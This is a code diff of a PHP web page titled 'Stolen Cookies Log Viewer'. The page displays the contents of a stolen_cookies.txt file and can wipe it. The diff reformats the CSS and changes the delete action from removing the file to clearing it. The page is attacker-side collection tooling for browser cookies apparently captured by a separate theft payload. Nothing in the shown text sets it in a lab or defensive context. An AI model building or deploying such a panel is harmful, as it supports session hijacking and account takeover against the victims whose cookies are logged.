@@ -1,47 +1,80 @@
 <!DOCTYPE html>
 <html>
+
 <head>
     <title>Stolen Cookies Log Viewer</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 2em; }
-        .container { max-width: 800px; margin: auto; }
-        pre { background: #f4f4f4; padding: 1em; border: 1px solid #ddd; white-space: pre-wrap; }
-        .log-entry { margin-bottom: 1em; padding: 1em; border-bottom: 1px solid #ccc; }
-        .delete-form { margin-top: 1em; }
-        .btn { padding: 10px 15px; background-color: #dc3545; color: white; border: none; cursor: pointer; }
-        .btn:hover { background-color: #c82333; }
+        body {
+            font-family: Arial, sans-serif;
+            margin: 2em;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: auto;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 1em;
+            border: 1px solid #ddd;
+            white-space: pre-wrap;
+        }
+
+        .log-entry {
+            margin-bottom: 1em;
+            padding: 1em;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .delete-form {
+            margin-top: 1em;
+        }
+
+        .btn {
+            padding: 10px 15px;
+            background-color: #dc3545;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background-color: #c82333;
+        }
     </style>
 </head>
+
 <body>
     <div class="container">
         <h1>Stolen Cookies Log</h1>
-        
-        <?php
-            $logFile = 'stolen_cookies.txt';
-            $deleteAction = false;
 
-            // Handle delete request
-            if (isset($_POST['delete'])) {
-                if (file_exists($logFile)) {
-                    unlink($logFile); // Delete the file
-                    $deleteAction = true;
-                    echo '<p style="color: green;">Log file has been deleted.</p>';
-                } else {
-                    echo '<p style="color: red;">Log file does not exist.</p>';
-                }
+        <?php
+        $logFile = 'stolen_cookies.txt';
+        $deleteAction = false;
+
+        // Handle delete request
+        if (isset($_POST['delete'])) {
+            if (file_exists($logFile)) {
+                file_put_contents($logFile, ''); // Clear the file contents
+                $deleteAction = true;
+                echo '<p style="color: green;">Log file contents have been cleared.</p>';
+            } else {
+                echo '<p style="color: red;">Log file does not exist.</p>';
             }
+        }
         ?>
 
         <h2>Log Entries:</h2>
         <?php
-            if (file_exists($logFile) && filesize($logFile) > 0) {
-                $fileContent = file_get_contents($logFile);
-                echo '<pre>' . htmlspecialchars($fileContent) . '</pre>';
-            } elseif (!$deleteAction) {
-                echo '<p>No cookies have been logged yet.</p>';
-            }
+        if (file_exists($logFile) && filesize($logFile) > 0) {
+            $fileContent = file_get_contents($logFile);
+            echo '<pre>' . htmlspecialchars($fileContent) . '</pre>';
+        } elseif (!$deleteAction) {
+            echo '<p>No cookies have been logged yet.</p>';
+        }
         ?>
-        
+
         <form method="post" class="delete-form">
             <button type="submit" name="delete" class="btn" onclick="return confirm('Are you sure you want to delete the log file? This action is irreversible.');">
                 Delete Log File
@@ -49,4 +82,5 @@
         </form>
     </div>
 </body>
+
 </html>
